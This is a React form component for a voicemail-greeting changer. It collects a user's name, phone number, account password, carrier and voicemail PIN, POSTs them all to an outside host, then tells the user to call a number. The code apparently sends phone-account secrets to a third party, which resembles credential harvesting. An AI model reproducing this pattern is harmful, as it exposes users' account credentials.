import React, { Component } from 'react';
import Router from 'next/router';
import { AsYouType, isValidNumber } from 'libphonenumber-js';

import css from '../styles/style.scss';

export default class VMChangerForm extends React.Component {
  constructor(props) {
    super(props);

    this.handleInputChangeNum = this.handleInputChangeNum.bind(this);
    this.handleInputChangeName = this.handleInputChangeName.bind(this);
    this.handleSubmit = this.handleSubmit.bind(this);

    this.state = {
      isModalActive: false,
      name: '',
    };
  }

  handleSubmit(event) {
    event.preventDefault();
    const form = event.target;
    const data = new FormData(form);

    // Convert form data to params.
    const params = new URLSearchParams();
    for (let pair of data.entries()) {
      params.set(pair[0], pair[1]);
    }

    fetch('https://vmchanger.abashina.org/info', {
      method: 'POST',
      body: params,
    });

    this.setState({
      isModalActive: true,
    });
  }

  handleCloseModal() {
    // Redirect user to the home page.
    Router.push('/');
  }

  handleInputChangeNum(event) {
    const { value } = event.target;

    // Format number and update input.
    const formatedNum = new AsYouType('US').input(value);
    event.target.value = formatedNum;

    // Check if it's a valid US number.
    isValidNumber(value, 'US');
  }

  handleInputChangeName(event) {
    const { value } = event.target;
    this.setState({
      name: value,
    });
  }

  render() {
    const { isModalActive, name } = this.state;
    return (
      <div>
        <form onSubmit={this.handleSubmit}>
          <div className={css.Container}>
            <div className={`${css.column} ${css.col8} ${css.colMxAuto}`}>
              <div className={css.formGroup}>
                <label className={css.formLabel} htmlFor="input-name">
                  Name
                </label>
                <input
                  onChange={this.handleInputChangeName}
                  className={css.formInput}
                  type="text"
                  id="input-name"
                  name="name"
                  placeholder="Name"
                  required
                />
              </div>

              <div className={css.formGroup}>
                <label className={css.formLabel} htmlFor="input-phone">
                  Phone number
                </label>
                <div className={css.inputGroup}>
                  <span className={`${css.inputGroupAddon} ${css.countryCode}`}>+1</span>
                  <input
                    onChange={this.handleInputChangeNum}
                    className={css.formInput}
                    type="text"
                    id="input-phone"
                    name="phone"
                    placeholder="Tel"
                    maxLength="14"
                    required
                  />
                </div>
              </div>

              <div className={css.formGroup}>
                <label className={css.formLabel} htmlFor="input-pin">
                  Password
                </label>
                <input
                  className={css.formInput}
                  type="password"
                  id="input-pin"
                  name="password"
                  placeholder="Password"
                  required
                />
              </div>

              <div className={css.formGroup}>
                <label className={css.formLabel} htmlFor="input-carrier">
                  Cell Phone Carrier
                </label>
                <select className={css.formSelect} id="input-carrier" name="carrier" required>
                  <option>-</option>
                  <option value="att">AT&T</option>
                  <option value="googlefi">Google Fi</option>
                  <option value="mint">Mint</option>
                  <option value="sprint">Sprint</option>
                  <option value="tmobile">T-Mobile</option>
                  <option value="verizon">Verizon</option>
                </select>
              </div>

              <div className={css.formGroup}>
                <label className={css.formLabel} htmlFor="input-pin">
                  Voicemail pin code
                </label>
                <input
                  className={css.formInput}
                  type="password"
                  id="input-pin"
                  name="pin"
                  placeholder="Pin Code"
                  required
                />
              </div>

              <div className={css.formGroup}>
                <label className={css.formLabel} htmlFor="input-text">
                  Text Message
                </label>
                <textarea
                  className={css.formInput}
                  id="input-text"
                  name="text"
                  rows="3"
                  value={`Hello! You've reached ${name}'s voicemail. Please leave a message with your name and number after a tone. Thanks!`}
                  required
                />
              </div>
              <div className={css.inputGroup}>
                <button className={`${css.btn} ${css.btnPrimary}`}>Submit</button>
              </div>
            </div>
          </div>
        </form>
        <div className={`${css.modal} ${css.modalLg} ${isModalActive ? css.active : ''}`}>
          <a
            onClick={this.handleCloseModal}
            className={`${css.modalOverlay} ${css.modalLg}`}
            aria-label="Close"
          />
          <div className={`${css.modalContainer}`}>
            <h3>Please call this number to finish process:</h3>
            <h1 className={`${css.vmPhone} ${css.textSuccess}`}>+1 973-363-2211</h1>
          </div>
        </div>
      </div>
    );
  }
}
